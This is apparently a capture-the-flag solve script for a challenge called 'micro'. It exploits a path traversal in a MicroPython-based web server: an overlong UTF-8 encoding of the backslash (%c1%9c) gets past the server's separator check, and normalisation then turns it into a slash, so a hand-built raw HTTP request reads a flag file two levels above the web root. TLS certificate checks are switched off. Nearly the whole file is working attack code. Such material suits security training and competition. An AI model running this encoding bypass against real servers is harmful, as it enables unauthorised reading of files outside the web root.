#!/usr/bin/env python3
"""Solve script for `micro`.

Usage: solve.py <host> <port>
       solve.py <url>          e.g. https://<session>.challenge.ecsc2026.de/
"""

import socket
import ssl
import sys
import os
import urllib.parse

# overlong (2 byte) encoding of U+005C. micropython's decoder takes it, so the
# separator check sees no backslash, but ord() says 92 and normpath() then
# hands us a real "/". E0 81 9C and F0 80 81 9C work just as well.
OVERLONG_BACKSLASH = "%c1%9c"

# www/ is /srv/www, so two levels up
PATH = "/.." + OVERLONG_BACKSLASH + ".." + OVERLONG_BACKSLASH + "flag.txt"


def target():
    args = sys.argv[1:]
    if len(args) == 0 and "SESSION_ENDPOINT" in os.environ:
        endpoint = os.environ["SESSION_ENDPOINT"]
        parsed = urllib.parse.urlparse(endpoint)
        if not parsed.hostname or not parsed.port:
            sys.exit(f"bad SESSION_ENDPOINT: {endpoint!r}")

        tls = parsed.scheme in ("https", "tls", "ssl")
        return parsed.hostname, parsed.port, tls
    if len(args) == 1 and "://" in args[0]:
        scheme, _, rest = args[0].partition("://")
        host = rest.split("/")[0]
        tls = scheme == "https"
        if ":" in host:
            host, _, port = host.partition(":")
            return host, int(port), tls
        return host, 443 if tls else 80, tls
    if len(args) == 2:
        port = int(args[1])
        return args[0], port, port == 443
    sys.exit("usage: %s <host> <port> | %s <url>" % (sys.argv[0], sys.argv[0]))


def fetch(host, port, tls, path):
    sock = socket.create_connection((host, port), timeout=30)
    if tls:
        sock = ssl._create_unverified_context().wrap_socket(sock, server_hostname=host)
    with sock:
        # by hand, every http client eats the ".." before it hits the wire
        sock.sendall(
            ("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (path, host)).encode()
        )
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks)


def main():
    host, port, tls = target()
    response = fetch(host, port, tls, PATH)
    if b"\r\n\r\n" not in response:
        sys.exit("no complete response: %r" % response[:200])

    head, body = response.split(b"\r\n\r\n", 1)
    status = head.split(b"\r\n", 1)[0]
    if b" 200 " not in status:
        sys.exit("traversal failed: %s" % status.decode(errors="replace"))

    flag = body.decode(errors="replace").strip()
    if not flag.startswith("ECSC{"):
        sys.exit("response did not look like a flag")

    with open("/flag", "w") as flag_file:
        flag_file.write(flag)
    print(flag)

main()
